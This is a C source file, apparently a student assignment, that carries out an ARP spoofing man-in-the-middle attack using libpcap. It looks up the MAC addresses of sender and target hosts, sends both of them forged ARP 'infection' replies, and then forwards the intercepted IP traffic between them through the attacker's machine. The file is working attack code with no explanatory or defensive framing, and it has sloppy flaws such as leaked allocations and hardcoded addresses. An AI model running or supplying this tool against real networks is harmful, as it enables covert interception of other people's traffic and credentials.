#include <pcap.h>
#include <headers.h>
#include <initial.h>

int main(int argc, char* argv[])
{
    int i = 0;
    int tmp;

    struct session sessions[argc - 2];


    uint8_t attacker_mac[6];
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t zero_mac[6] = {0, 0, 0, 0, 0, 0};
    uint8_t zero_ip[4] = {172, 30, 1, 34};

    struct pcap_pkthdr* header;
    const u_char* packet;
    const u_char* S_infection_packet[argc - 2];
    const u_char* T_infection_packet[argc - 2];
    char *buf[256];
    int res;
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if(!handle)
    {
        fprintf(stderr, "[-] could not open device %s : %s\n", dev, errbuf);
        return -1;
    }

    for(i = 2; i < argc; i += 2)
    {
        ip_retype(argv[i],sessions[(i / 2) - 1].sender_ip);
        ip_retype(argv[i + 1],sessions[(i / 2) - 1].target_ip);
        printf("[+] %d : sender ip : %08x\n", i / 2, sessions[((i / 2) - 1)].sender_ip[3]);
        printf("[+] %d : target ip : %08x\n", i / 2, sessions[((i / 2) - 1)].target_ip[3]);
    }

    get_my_mac(attacker_mac, argv[1]);
    printf("[+] my mac = %02x:%02x:%02x:%02x:%02x:%02x\n",attacker_mac[0],attacker_mac[1],attacker_mac[2],attacker_mac[3],attacker_mac[4],attacker_mac[5]);

    for(i = 0; i < (argc - 2) / 2; i++)
    {
        packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, zero_ip, zero_mac, sessions[i].sender_ip);
        pcap_sendpacket(handle, packet, 42);
        while(true)
        {
            res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            struct ethernet_hdr* eth= (struct ethernet_hdr*)malloc(14);
            eth = (struct ethernet_hdr*)packet;
            struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
            arp = (struct arp_hdr*)(packet + 14);
            if(eth->ether_type == 0x0608 && arp->S_protocol_addr[3] == sessions[i].sender_ip[3])
            {
                for(int j = 0; j < 6; j++)
                {
                    sessions[i].sender_mac[j] = arp->S_hardware_addr[j];
                }

                printf("[+] %d : sender_mac set clear\n", i + 1);
                break;
            }
        }
    }

    for(i = 0; i < (argc - 2) / 2; i++)
    {
        packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, zero_ip, zero_mac, sessions[i].target_ip);
        pcap_sendpacket(handle, packet, 42);
        while(true)
        {
            res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            struct ethernet_hdr* eth= (struct ethernet_hdr*)malloc(14);
            eth = (struct ethernet_hdr*)packet;
            struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
            arp = (struct arp_hdr*)(packet + 14);
            if(eth->ether_type == 0x0608 && arp->S_protocol_addr[3] == sessions[i].target_ip[3])
            {
                for(int j = 0; j < 6; j++)
                {
                    sessions[i].target_mac[j] = arp->S_hardware_addr[j];
                }
                printf("[+] %d : target_mac set clear\n", i + 1);
                break;
            }
        }
    }

    for(i = 0; i < (argc - 2) / 2; i++)
    {
        S_infection_packet[i] = make_arp(REPLY, attacker_mac, sessions[i].sender_mac, attacker_mac, sessions[i].target_ip, sessions[i].sender_mac, sessions[i].sender_ip);
        pcap_sendpacket(handle, S_infection_packet[i], 42);
        printf("[+] infection_packet for session no.%d is sended\n", i + 1);
    }

    for(i = 0; i < (argc -2) / 2; i++)
    {
        T_infection_packet[i] = make_arp(REPLY, attacker_mac, sessions[i].target_mac, attacker_mac, sessions[i].sender_ip, sessions[i].target_mac, sessions[i].target_ip);
        pcap_sendpacket(handle, T_infection_packet[i], 42);
        printf("[+] infection_packet for session no.%d is sended\n", i + 1);
    }


    while(true)
    {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == -1 || res == -2)
            break;

        struct ethernet_hdr* eth = (struct ethernet_hdr*)malloc(14);
        eth = (struct ethernet_hdr*)packet;

        if(eth -> ether_type == 0x0080)
        {
            printf("spoofed ip packet arrived!\n");
            struct ip_hdr* ip = (struct ip_hdr*)malloc(20);
            ip = (struct ip_hdr*)(packet + 14);
            tmp = -1;
            for(i = 0; i < (argc - 2) / 2; i++)
            {
                if(ip -> S_ip[3] == sessions[i].sender_ip[3])
                {
                    memcpy(eth -> ether_smac, attacker_mac, 6);
                    memcpy(eth -> ether_dmac, sessions[i].target_mac, 6);
                    break;
                }
                else if(ip -> S_ip[3] == sessions[i].target_ip[3] && ip -> D_ip[3] == sessions[i].sender_ip[3])
                {
                    memcpy(eth -> ether_smac, attacker_mac, 6);
                    memcpy(eth -> ether_dmac, sessions[i].sender_mac, 6);
                    break;
                }
            }
            pcap_sendpacket(handle, packet, 34);
        }
        else if(eth -> ether_type == 0x0608)
        {
            struct arp_hdr* arp = (struct arp_hdr*)malloc(28);
            arp = (struct arp_hdr*)(packet + 14);
        }

    }

    return 0;
}
